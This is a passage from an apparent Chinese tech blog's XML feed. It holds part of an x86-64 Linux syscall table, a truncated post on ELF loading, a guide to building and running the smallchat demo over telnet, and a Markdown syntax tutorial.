maxnode</td><td>const unsigned long *old_nodes</td><td>const unsigned long *new_nodes</td><td></td><td></td></tr><tr><td>257</td><td>sys_openat</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td></tr><tr><td>258</td><td>sys_mkdirat</td><td>int dfd</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>259</td><td>sys_mknodat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>unsigned dev</td><td></td><td></td></tr><tr><td>260</td><td>sys_fchownat</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td></td></tr><tr><td>261</td><td>sys_futimesat</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td></tr><tr><td>262</td><td>sys_newfstatat</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td></td><td></td></tr><tr><td>263</td><td>sys_unlinkat</td><td>int dfd</td><td>const char *pathname</td><td>int flag</td><td></td><td></td><td></td></tr><tr><td>264</td><td>sys_renameat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td></tr><tr><td>265</td><td>sys_linkat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td>int flags</td><td></td></tr><tr><td>266</td><td>sys_symlinkat</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td><td></td></tr><tr><td>267</td><td>sys_readlinkat</td><td>int dfd</td><td>const char *pathname</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td></tr><tr><td>268</td><td>sys_fchmodat</td><td>int dfd</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td></tr><tr><td>269</td><td>sys_faccessat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>270</td><td>sys_pselect6</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timespec *tsp</td><td>void *sig</td></tr><tr><td>271</td><td>sys_ppoll</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>struct timespec *tsp</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td><td></td></tr><tr><td>272</td><td>sys_unshare</td><td>unsigned long unshare_flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>273</td><td>sys_set_robust_list</td><td>struct robust_list_head *head</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>274</td><td>sys_get_robust_list</td><td>int pid</td><td>struct robust_list_head **head_ptr</td><td>size_t *len_ptr</td><td></td><td></td><td></td></tr><tr><td>275</td><td>sys_splice</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>276</td><td>sys_tee</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>277</td><td>sys_sync_file_range</td><td>long fd</td><td>loff_t offset</td><td>loff_t bytes</td><td>long flags</td><td></td><td></td></tr><tr><td>278</td><td>sys_vmsplice</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>279</td><td>sys_move_pages</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void **pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td>280</td><td>sys_utimensat</td><td>int dfd</td><td>const char *filename</td><td>struct timespec *utimes</td><td>int flags</td><td></td><td></td></tr><tr><td>281</td><td>sys_epoll_pwait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td>282</td><td>sys_signalfd</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td></td><td></td><td></td></tr><tr><td>283</td><td>sys_timerfd_create</td><td>int clockid</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>284</td><td>sys_eventfd</td><td>unsigned int count</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>285</td><td>sys_fallocate</td><td>long fd</td><td>long mode</td><td>loff_t offset</td><td>loff_t len</td><td></td><td></td></tr><tr><td>286</td><td>sys_timerfd_settime</td><td>int ufd</td><td>int flags</td><td>const struct itimerspec *utmr</td><td>struct itimerspec *otmr</td><td></td><td></td></tr><tr><td>287</td><td>sys_timerfd_gettime</td><td>int ufd</td><td>struct itimerspec *otmr</td><td></td><td></td><td></td><td></td></tr><tr><td>288</td><td>sys_accept4</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td>int flags</td><td></td><td></td></tr><tr><td>289</td><td>sys_signalfd4</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td></td><td></td></tr><tr><td>290</td><td>sys_eventfd2</td><td>unsigned int count</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>291</td><td>sys_epoll_create1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>292</td><td>sys_dup3</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>293</td><td>sys_pipe2</td><td>int *filedes</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>294</td><td>sys_inotify_init1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>295</td><td>sys_preadv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>296</td><td>sys_pwritev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>297</td><td>sys_rt_tgsigqueueinfo</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td></tr><tr><td>298</td><td>sys_perf_event_open</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td></td></tr><tr><td>299</td><td>sys_recvmmsg</td><td>int fd</td><td>struct msghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td>struct timespec *timeout</td><td></td></tr><tr><td>300</td><td>sys_fanotify_init</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>301</td><td>sys_fanotify_mark</td><td>long fanotify_fd</td><td>long flags</td><td>__u64 mask</td><td>long dfd</td><td>long pathname</td><td></td></tr><tr><td>302</td><td>sys_prlimit64</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td></td><td></td></tr><tr><td>303</td><td>sys_name_to_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td></td></tr><tr><td>304</td><td>sys_open_by_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flags</td><td></td></tr><tr><td>305</td><td>sys_clock_adjtime</td><td>clockid_t which_clock</td><td>struct timex *tx</td><td></td><td></td><td></td><td></td></tr><tr><td>306</td><td>sys_syncfs</td><td>int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>307</td><td>sys_sendmmsg</td><td>int fd</td><td>struct mmsghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>308</td><td>sys_setns</td><td>int fd</td><td>int nstype</td><td></td><td></td><td></td><td></td></tr><tr><td>309</td><td>sys_getcpu</td><td>unsigned *cpup</td><td>unsigned *nodep</td><td>struct getcpu_cache *unused</td><td></td><td></td><td></td></tr><tr><td>310</td><td>sys_process_vm_readv</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>311</td><td>sys_process_vm_writev</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovcc *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>312</td><td>sys_kcmp</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td></td></tr><tr><td>313</td><td>sys_finit_module</td><td>int fd</td><td>const char __user *uargs</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>314</td><td>sys_sched_setattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>315</td><td>sys_sched_getattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>316</td><td>sys_renameat2</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>unsigned int flags</td><td></td></tr><tr><td>317</td><td>sys_seccomp</td><td>unsigned int op</td><td>unsigned int flags</td><td>const char __user *uargs</td><td></td><td></td><td></td></tr><tr><td>318</td><td>sys_getrandom</td><td>char __user *buf</td><td>size_t count</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>319</td><td>sys_memfd_create</td><td>const char __user *uname_ptr</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>320</td><td>sys_kexec_file_load</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char __user *cmdline_ptr</td><td>unsigned long flags</td><td></td></tr><tr><td>321</td><td>sys_bpf</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td></td><td></td><td></td></tr><tr><td>322</td><td>stub_execveat</td><td>int dfd</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>int flags</td><td></td></tr><tr><td>323</td><td>userfaultfd</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>324</td><td>membarrier</td><td>int cmd</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>325</td><td>mlock2</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>326</td><td>copy_file_range</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user * off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>327</td><td>preadv2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr><tr><td>328</td><td>pwritev2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr></tbody></table><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>系统调用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下的ELF文件装载</title>
    <link href="/2023/11/09/Linux%E4%B8%8B%E7%9A%84ELF%E6%96%87%E4%BB%B6%E8%A3%85%E8%BD%BD/"/>
    <url>/2023/11/09/Linux%E4%B8%8B%E7%9A%84ELF%E6%96%87%E4%BB%B6%E8%A3%85%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>简单介绍Linux下的ELF文件的装载过程</p><span id="more"></span><h1 id="ELF文件的装载"><a href="#ELF文件的装载" class="headerlink" title="ELF文件的装载"></a>ELF文件的装载</h1><p>当我们在shell中执行一个可执行文件时，在操作系统中发生了什么？</p><p>笼统的来说：首先在用户层面，shell会使用fork()函数，先创建一个新的进程；然后这个新的进程使用函数execve()函数执行指定的ELF文件。</p><p>详细来说主要有这几个过程：   </p><ol><li>在进入了execve()系统调用后，Linux内核会</li></ol>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>ELF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Github 上的小项目——SmallChat</title>
    <link href="/2023/11/07/Github-%E4%B8%8A%E7%9A%84%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94SmallChat/"/>
    <url>/2023/11/07/Github-%E4%B8%8A%E7%9A%84%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94SmallChat/</url>
    
    <content type="html"><![CDATA[<p>Redis创始人仅用200行代码，编写的教育项目——SmallChat</p><span id="more"></span><h1 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h1><p>Github仓库地址<br>仓库地址：<a href="https://github.com/antirez/smallchat">https://github.com/antirez/smallchat</a></p><h2 id="下载代码"><a href="#下载代码" class="headerlink" title="下载代码"></a>下载代码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git@github.com:Tinywan/smallchat.git<br></code></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd smallchat/<br>gcc -o smallchat smallchat.c<br></code></pre></td></tr></table></figure><blockquote><p>参数 -o 指定一个输出文件，这里为smallchat。smallchat.c为源文件</p></blockquote><p>编译后会生成一个smallchat 二进制文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">smallchat$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>Makefile  README.md  smallchat  smallchat.c<br></code></pre></td></tr></table></figure><p>直接启动服务端二进制文件即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./smallchat 127.0.0.1 7711<br></code></pre></td></tr></table></figure><h1 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h1><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>服务端默认端口是7771。当然你也可以修改重新编译成自己想要的端口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_PORT 7711</span><br></code></pre></td></tr></table></figure><h2 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h2><blockquote><p>终端1</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet 127.0.0.1 7711<br>Trying 127.0.0.1...<br>Connected to 127.0.0.1.<br>Escape character is &#x27;^]&#x27;.<br>Welcome to Simple Chat! Use /nick &lt;nick&gt; to set your nick.<br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置客户端昵称 /nick 你的昵称</span><br>/nick tinywan001<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">发送消息</span><br>This is just a programming example (tinywan001)<br></code></pre></td></tr></table></figure><p>图片</p><blockquote><p>终端2</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet 127.0.0.1 7711<br>Trying 127.0.0.1...<br>Connected to 127.0.0.1.<br>Escape character is &#x27;^]&#x27;.<br>Welcome to Simple Chat! Use /nick &lt;nick&gt; to set your nick.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置客户端昵称 /nick 你的昵称</span><br>/nick tinywan002<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">发送消息</span><br>Since I wrote this little program (tinywan002)<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/20231107192426.png"></p><blockquote><p>服务端</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">./smallchat <br>Connected client fd=4<br>Connected client fd=5<br><span class="hljs-meta prompt_">tinywan002&gt; </span><span class="language-bash">Since I wrote this little program (tinywan002)</span><br><span class="hljs-meta prompt_">tinywan001&gt; </span><span class="language-bash">This is just a programming example (tinywan001)</span><br><span class="hljs-meta prompt_">tinywan001&gt; </span><span class="language-bash">001</span><br><span class="hljs-meta prompt_">tinywan002&gt; </span><span class="language-bash">002</span><br><span class="hljs-meta prompt_">tinywan002&gt; </span><span class="language-bash">002002002</span><br><span class="hljs-meta prompt_">tinywan001&gt; </span><span class="language-bash">001001001001</span><br><br>Disconnected client fd=5, nick=tinywan002<br>Disconnected client fd=4, nick=tinywan001<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/20231107192407.png"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="telnet-命令"><a href="#telnet-命令" class="headerlink" title="telnet 命令"></a>telnet 命令</h2><p>telnet是一种远程连接协议，用于通过网络连接到远程设备进行控制和操作。其中，<code>ip</code>是指连接的远程设备的ip地址。使用<code>telnet ip</code>命令，在命令行中输入telnet 后输入连接的ip地址和端口号，就可以远程连接到目标设备进行操作了。</p><p>具体命令格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet ip_address port<br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>本文章转载自：<a href="https://mp.weixin.qq.com/s/m0fztuw3iEHQ4wWmXlAsjA">https://mp.weixin.qq.com/s/m0fztuw3iEHQ4wWmXlAsjA</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>开源项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown基础语法</title>
    <link href="/2023/11/07/Markdown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <url>/2023/11/07/Markdown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>Markdown基本语法</p><span id="more"></span><h2 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs md"><span class="hljs-emphasis">*这是斜体*</span><br><span class="hljs-emphasis">_这也是斜体_</span><br></code></pre></td></tr></table></figure><h2 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs md">这是<span class="hljs-code">`行内代码`</span><br></code></pre></td></tr></table></figure><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>inline-style 的语法：<a href="url-link" title="optional-tips">link-text</a>，其中：</p><p>link-text： 显示的 链接文本<br>url-link： url链接<br>optional-tips： 当鼠标放置在link-text上显示的提示<br>reference-style 的语法包括两部分：</p><p>[link-text][reference-id]<br>[reference-id]:url-link “optional-tips”： 在同一个文件的其他段落定义</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">这是[<span class="hljs-string">百度搜索</span>](<span class="hljs-link">www.baidu.com &quot;使用百度进行搜索&quot;</span>)inline-style<br><br>这是[<span class="hljs-string">百度搜索</span>][<span class="hljs-symbol">baidu</span>]reference-style<br><br>[<span class="hljs-symbol">baidu</span>]:<span class="hljs-link">www.baidu.com &quot;使用百度进行搜索&quot;</span><br></code></pre></td></tr></table></figure><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs md"><span class="hljs-bullet">0.</span> 这是一级有序列表<br><span class="hljs-bullet">    1.</span> 这是二级有序列表<br><span class="hljs-bullet">        1.</span> 这是三级有序列表<br><span class="hljs-bullet">8.</span> 这是一级有序列表<br><span class="hljs-bullet">0.</span> 这是一级有序列表<br><br></code></pre></td></tr></table></figure><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs md"><span class="hljs-bullet">*</span> 这是无序列表<br><span class="hljs-bullet">+</span> 这是无序列表<br><span class="hljs-bullet">-</span> 这是无序列表<br><br><span class="hljs-bullet">+</span> 这是一级无序列表<br><span class="hljs-bullet">    1.</span> 这是二级有序列表<br><span class="hljs-bullet">    1.</span> 这是二级有序列表<br><span class="hljs-bullet">+</span> 这是一级无序列表<br><br></code></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs md">&gt;这是一级引用<br>&gt;&gt;这是二级引用<br>&gt;&gt;&gt;这是三级引用<br>&gt;&gt;这还是三级引用<br>&gt;这还是三级引用<br><br>&gt;新的引用段落<br><br></code></pre></td></tr></table></figure><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs md">表格字段一|表格字段二|表格字段三|表格字段四<br>--|:--|--:|:--:<br>默认居中对齐|左对齐|右对齐|居中对齐<br>cell|cell|cell|cell<br><br></code></pre></td></tr></table></figure><h2 id="分隔行"><a href="#分隔行" class="headerlink" title="分隔行"></a>分隔行</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs md">在单独的一个段落中使用三个或多于三个<span class="hljs-emphasis">*或-或_将被渲染成分隔行。</span><br></code></pre></td></tr></table></figure><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>Markdown中嵌入图片的语法跟链接的语法类似，差别在于嵌入图片比嵌入链接前多了个!特殊字符表示这是一个指向图片的url。</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs md">这是一张使用inline-style链接的图片<br><br>[图片上传失败...(image-6ec809-1531624818276)]<br><br><br>这是一张使用reference-style链接的图片<br>![<span class="hljs-string">当图片无法显示时出现这个文本</span>][<span class="hljs-symbol">reference-id</span>]<br><br>[<span class="hljs-symbol">reference-id</span>]:<span class="hljs-link">image-url &quot;optional-tips&quot;</span><br></code></pre></td></tr></table></figure><h2 id="文章内部跳转"><a href="#文章内部跳转" class="headerlink" title="文章内部跳转"></a>文章内部跳转</h2><p>在vscode中左边栏有一个大纲，可以实现跳转</p><ol><li>利用<code>html</code>，在需要跳转到的地方设置一个锚：<span id="jump">跳转到的地方</span></li><li>在跳转地：<a href="#jump">点击跳转</a></li></ol><h2 id="代码块的另一种方式"><a href="#代码块的另一种方式" class="headerlink" title="代码块的另一种方式"></a>代码块的另一种方式</h2><pre><code class="hljs">ls</code></pre><h2 id="特殊的代码块"><a href="#特殊的代码块" class="headerlink" title="特殊的代码块"></a>特殊的代码块</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+ this text is highlighted in green</span><br><span class="hljs-deletion">- this text is highlighted in red</span><br></code></pre></td></tr></table></figure><h1 id="其他常用的HTML语法"><a href="#其他常用的HTML语法" class="headerlink" title="其他常用的HTML语法"></a>其他常用的HTML语法</h1><h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h2><p><ins>Underlined text</ins></p><h2 id="方框"><a href="#方框" class="headerlink" title="方框"></a>方框</h2><table><tr><td>Boxed text</td></tr></table><h2 id="上标"><a href="#上标" class="headerlink" title="上标"></a>上标</h2><p>Superscript<sup>TM</sup><br>Superscript-italic<sup><em>tm</em></sup></p><h2 id="下标"><a href="#下标" class="headerlink" title="下标"></a>下标</h2><p>Subscript<sub>x</sub><br>Subscript-bold<sub><strong>min</strong></sub></p><h1 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h1><p>在这段文字后添加一个脚注<a href="%E8%BF%99%E9%87%8C%E6%98%AF%E8%84%9A%E6%B3%A8%E7%9A%84%E5%86%85%E5%AE%B9.">^footnote</a>.</p><p>footnote 可以是任意英文字符或者是数字；<br>脚注的内容可以放在文章的任意位置（一般放最后）。</p><h1 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h1><p>在[]中输入x表示完成，也可以通过点击选择完成或者没完成</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> [ ] 吃饭<br><span class="hljs-bullet">-</span> [ ] 逛街<br><span class="hljs-bullet">-</span> [x] 看电影<br><span class="hljs-bullet">-</span> [X] 阅读<br><span class="hljs-bullet">-</span> [ ] 遛狗<br></code></pre></td></tr></table></figure><ul><li><input checked="" disabled="" type="checkbox"> 遛狗</li></ul><h1 id="特殊的块"><a href="#特殊的块" class="headerlink" title="特殊的块"></a>特殊的块</h1><p>{ % note warning % }<br>Note1: 立即数只能作为源操作数，而不能作为目的操作数。<br>{ % endnote % }</p><p>warning还可以使用一下单词来替代。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs zsh">primary<br><br>secondary<br><br>success<br><br>danger<br><br>warning<br><br>info<br><br>light<br></code></pre></td></tr></table></figure><h1 id="markdown中的注释"><a href="#markdown中的注释" class="headerlink" title="markdown中的注释"></a>markdown中的注释</h1><!-- asdfasdf --><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><ul><li>在<code> </code>中表示&#96;<ul><li><code>`a</code></li></ul></li></ul><p>在表格中换行使用<code>&lt;br&gt;</code></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://markdown.com.cn/basic-syntax/">markdown官方手册</a></p><p><a href="https://github.com/Olwiba/Kickass-markdown?tab=readme-ov-file#license">github所支持的Markwodn语法</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读书笔记——Linux下的头文件包含问题</title>
    <link href="/2023/11/07/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux%E4%B8%8B%E7%9A%84%E5%A4%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98/"/>
    <url>/2023/11/07/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux%E4%B8%8B%E7%9A%84%E5%A4%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98/</url>
    
